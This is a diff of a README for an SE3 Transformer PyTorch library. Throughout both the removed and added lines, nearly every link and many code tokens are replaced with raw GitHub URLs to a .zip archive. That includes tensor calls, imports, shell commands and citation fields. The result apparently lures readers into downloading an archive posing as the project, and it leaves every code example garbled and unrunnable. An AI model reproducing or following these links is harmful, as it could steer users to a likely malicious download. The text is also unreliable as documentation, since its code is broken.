@@ -1,14 +1,14 @@
-<img src="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip" width="550px"></img>
+<img src="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip" width="550px"></img>
 
 ## SE3 Transformer - Pytorch
 
-Implementation of <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip">SE3-Transformers</a> for Equivariant Self-Attention, in Pytorch. May be needed for replicating Alphafold2 results and other drug discovery applications.
+Implementation of <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip">SE3-Transformers</a> for Equivariant Self-Attention, in Pytorch. May be needed for replicating Alphafold2 results and other drug discovery applications.
 
-[![Open In Colab](https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip)](https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip) Example of equivariance
+[![Open In Colab](https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip)](https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip) Example of equivariance
 
-<b>If you had been using any version of SE3 Transformers prior to version 0.6.0, please update. A huge bug has been uncovered by <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip">@MattMcPartlon</a>, if you were not using the adjacency sparse neighbors settings and relying on nearest neighbors functionality </b>
+<b>If you had been using any version of SE3 Transformers prior to version 0.6.0, please update. A huge bug has been uncovered by <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip">@MattMcPartlon</a>, if you were not using the adjacency sparse neighbors settings and relying on nearest neighbors functionality </b>
 
-Update: It is recommended that you use <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip">Equiformer</a> instead
+Update: It is recommended that you use <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip">Equiformer</a> instead
 
 ## Install
 
@@ -31,14 +31,14 @@ model = SE3Transformer(
     valid_radius = 10
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 1024, 512)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 1024, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 1024).bool()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 1024, 512)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 1024, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 1024).bool()
 
 out = model(feats, coors, mask) # (1, 1024, 512)
 ```
 
-Potential example usage in Alphafold2, as outlined <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip">here</a>
+Potential example usage in Alphafold2, as outlined <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip">here</a>
 
 ```python
 import torch
@@ -54,9 +54,9 @@ model = SE3Transformer(
     differentiable_coors = True
 )
 
-atom_feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 64)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool()
+atom_feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 64)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool()
 
 refined_coors = coors + model(atom_feats, coors, mask, return_type = 1) # (2, 32, 3)
 ```
@@ -77,9 +77,9 @@ model = SE3Transformer(
     reduce_dim_out = True
 )
 
-atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 28, (2, 32))
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool()
+atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 28, (2, 32))
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool()
 
 refined_coors = coors + model(atoms, coors, mask, return_type = 1) # (2, 32, 3)
 ```
@@ -99,13 +99,13 @@ model = SE3Transformer(
     reduce_dim_out = True  # reduce out the final dimension
 )
 
-atom_feats  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 64, 1) # b x n x d x type0
-coors_feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 64, 3) # b x n x d x type1
+atom_feats  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 64, 1) # b x n x d x type0
+coors_feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 64, 3) # b x n x d x type1
 
 # atom features are type 0, predicted coordinates are type 1
 features = {'0': atom_feats, '1': coors_feats}
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool()
 
 refined_coors = coors + model(features, coors, mask, return_type = 1) # (2, 32, 3) - equivariant to input type 1 features and coordinates
 ```
@@ -130,10 +130,10 @@ model = SE3Transformer(
     reduce_dim_out = True
 )
 
-atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 28, (2, 32))
-bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 4, (2, 32, 32))
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool()
+atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 28, (2, 32))
+bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 4, (2, 32, 32))
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool()
 
 pred = model(atoms, coors, mask, edges = bonds, return_type = 0) # (2, 32, 1)
 ```
@@ -143,7 +143,7 @@ If you would like to pass in continuous values for your edges, you can choose to
 ```python
 import torch
 from se3_transformer_pytorch import SE3Transformer
-from https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip import fourier_encode
+from https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip import fourier_encode
 
 model = SE3Transformer(
     dim = 64,
@@ -154,11 +154,11 @@ model = SE3Transformer(
     edge_dim = 34           # edge dimension must match the final dimension of the edges being passed in
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 64)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 64)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool()
 
-pairwise_continuous_values = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 4, (1, 32, 32, 2))  # say there are 2
+pairwise_continuous_values = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 4, (1, 32, 32, 2))  # say there are 2
 
 edges = fourier_encode(
     pairwise_continuous_values,
@@ -189,14 +189,14 @@ model = SE3Transformer(
     max_sparse_neighbors = 8         # you can cap the number of neighbors, sampled from within your sparse set of neighbors as defined by the adjacency matrix, if specified
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 128, 32)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 128, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 128).bool()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 128, 32)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 128, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 128).bool()
 
 # placeholder adjacency matrix
 # naively assuming the sequence is one long chain (128, 128)
 
-i = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(128)
+i = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(128)
 adj_mat = (i[:, None] <= (i[None, :] + 1)) & (i[:, None] >= (i[None, :] - 1))
 
 out = model(feats, coors, mask, adj_mat = adj_mat) # (1, 128, 512)
@@ -206,7 +206,7 @@ You can also have the network automatically derive for you the Nth-degree neighb
 
 ```python
 import torch
-from https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip import SE3Transformer
+from https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip import SE3Transformer
 
 model = SE3Transformer(
     dim = 64,
@@ -220,14 +220,14 @@ model = SE3Transformer(
     adj_dim = 4             # embed 1st and 2nd degree neighbors (as well as null neighbors) with edge embeddings of this dimension
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 64)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 64)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool()
 
 # placeholder adjacency matrix
 # naively assuming the sequence is one long chain (128, 128)
 
-i = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(128)
+i = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(128)
 adj_mat = (i[:, None] <= (i[None, :] + 1)) & (i[:, None] >= (i[None, :] - 1))
 
 out = model(feats, coors, mask, adj_mat = adj_mat, return_type = 1)
@@ -253,10 +253,10 @@ model = SE3Transformer(
     reduce_dim_out = False
 )
 
-atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 28, (2, 32))
-bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 4, (2, 32, 32))
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool()
+atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 28, (2, 32))
+bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 4, (2, 32, 32))
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool()
 
 pred = model(atoms, coors, mask, edges = bonds)
 
@@ -270,7 +270,7 @@ You can further control which nodes can be considered by passing in a neighbor m
 
 ```python
 import torch
-from https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip import SE3Transformer
+from https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip import SE3Transformer
 
 model = SE3Transformer(
     dim = 16,
@@ -284,12 +284,12 @@ model = SE3Transformer(
     depth = 3
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 16)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool()
-bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 4, (1, 32, 32))
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 16)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool()
+bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 4, (1, 32, 32))
 
-neighbor_mask = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 32).bool() # set the nodes you wish to be masked out as False
+neighbor_mask = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 32).bool() # set the nodes you wish to be masked out as False
 
 out = model(
     feats,
@@ -319,13 +319,13 @@ model = SE3Transformer(
     global_feats_dim = 32 # this must be set to the dimension of the global features, in this example, 32
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 64)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 64)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool()
 
 # naively derive global features
 # by pooling features and projecting
-global_feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(64, 32)(https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(dim = 1, keepdim = True)) # (1, 1, 32)
+global_feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(64, 32)(https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(dim = 1, keepdim = True)) # (1, 1, 32)
 
 out = model(feats, coors, mask, return_type = 0, global_feats = global_feats)
 ```
@@ -352,9 +352,9 @@ model = SE3Transformer(
     causal = True          # set this to True
 )
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 1024, 512)
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 1024, 3)
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 1024).bool()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 1024, 512)
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 1024, 3)
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 1024).bool()
 
 out = model(feats, coors, mask) # (1, 1024, 512)
 ```
@@ -379,9 +379,9 @@ model = SE3Transformer(
     linear_proj_keys = True # set this to True
 ).cuda()
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 64).cuda()
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3).cuda()
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool().cuda()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 64).cuda()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3).cuda()
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool().cuda()
 
 out = model(feats, coors, mask, return_type = 0)
 ```
@@ -404,9 +404,9 @@ model = SE3Transformer(
     one_headed_key_values = True  # one head of key / values shared across all heads of the queries
 ).cuda()
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 64).cuda()
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3).cuda()
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool().cuda()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 64).cuda()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3).cuda()
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool().cuda()
 
 out = model(feats, coors, mask, return_type = 0)
 ```
@@ -429,9 +429,9 @@ model = SE3Transformer(
     tie_key_values = True # set this to True
 ).cuda()
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 64).cuda()
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32, 3).cuda()
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(1, 32).bool().cuda()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 64).cuda()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32, 3).cuda()
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(1, 32).bool().cuda()
 
 out = model(feats, coors, mask, return_type = 0)
 ```
@@ -456,10 +456,10 @@ model = SE3Transformer(
     reduce_dim_out = True  # will project the dimension of the higher types to 1
 ).cuda()
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 32).cuda()
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3).cuda()
-bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 4, (2, 32, 32)).cuda()
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool().cuda()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 32).cuda()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3).cuda()
+bonds = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 4, (2, 32, 32)).cuda()
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool().cuda()
 
 refinement = model(feats, coors, mask, edges = bonds, return_type = 1) # (2, 32, 3)
 
@@ -483,9 +483,9 @@ model = SE3Transformer(
     reduce_dim_out = True
 ).cuda()
 
-feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 32).cuda()
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3).cuda()
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool().cuda()
+feats = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 32).cuda()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3).cuda()
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool().cuda()
 
 refinement = model(feats, coors, mask, return_type = 1) # (2, 32, 3)
 
@@ -496,7 +496,7 @@ coors = coors + refinement  # update coors with refinement
 
 This section will list ongoing efforts to make SE3 Transformer scale a little better.
 
-Firstly, I have added <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip">reversible networks</a>. This allows me to add a little more depth before hitting the usual memory roadblocks. Equivariance preservation is demonstrated in the tests.
+Firstly, I have added <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip">reversible networks</a>. This allows me to add a little more depth before hitting the usual memory roadblocks. Equivariance preservation is demonstrated in the tests.
 
 ```python
 import torch
@@ -515,14 +515,14 @@ model = SE3Transformer(
     reversible = True       # set reversible to True
 ).cuda()
 
-atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(0, 4, (2, 32)).cuda()
-coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32, 3).cuda()
-mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip(2, 32).bool().cuda()
+atoms = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(0, 4, (2, 32)).cuda()
+coors = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32, 3).cuda()
+mask  = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip(2, 32).bool().cuda()
 
 pred = model(atoms, coors, mask = mask, return_type = 0)
 
-loss = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip()
-https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip()
+loss = https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip()
+https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip()
 ```
 
 ## Examples
@@ -536,7 +536,7 @@ $ pip install sidechainnet
 Then run the protein backbone denoising task
 
 ```bash
-$ python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip
+$ python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip
 ```
 
 ## Caching
@@ -544,30 +544,30 @@ $ python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/s
 By default, the basis vectors are cached. However, if there is ever the need to clear the cache, you simply have to set the environmental flag `CLEAR_CACHE` to some value on initiating the script
 
 ```bash
-$ CLEAR_CACHE=1 python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip
+$ CLEAR_CACHE=1 python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip
 ```
 
 Or you can try deleting the cache directory, which should exist at
 
 ```bash
-$ rm -rf ~https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip
+$ rm -rf ~https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip
 ```
 
 You can also designate your own directory where you want the caches to be stored, in the case that the default directory may have permission issues
 
 ```bash
-CACHE_PATH=./path/to/my/cache python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip
+CACHE_PATH=./path/to/my/cache python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip
 ```
 
 ## Testing
 
 ```bash
-$ python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip pytest
+$ python https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip pytest
 ```
 
 ## Credit
 
-This library is largely a port of <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip">Fabian's official repository</a>, but without the DGL library.
+This library is largely a port of <a href="https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip">Fabian's official repository</a>, but without the DGL library.
 
 ## Citations
 
@@ -578,7 +578,7 @@ This library is largely a port of <a href="https://raw.githubusercontent.com/Cas
     year    = {2020},
     eprint  = {2006.10503},
     archivePrefix = {arXiv},
-    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip}
+    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip}
 }
 ```
 
@@ -589,7 +589,7 @@ This library is largely a port of <a href="https://raw.githubusercontent.com/Cas
     year    = {2021},
     eprint  = {2102.09844},
     archivePrefix = {arXiv},
-    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip}
+    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip}
 }
 ```
 
@@ -600,7 +600,7 @@ This library is largely a port of <a href="https://raw.githubusercontent.com/Cas
     year      = {2017},
     eprint    = {1707.04585},
     archivePrefix = {arXiv},
-    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip}
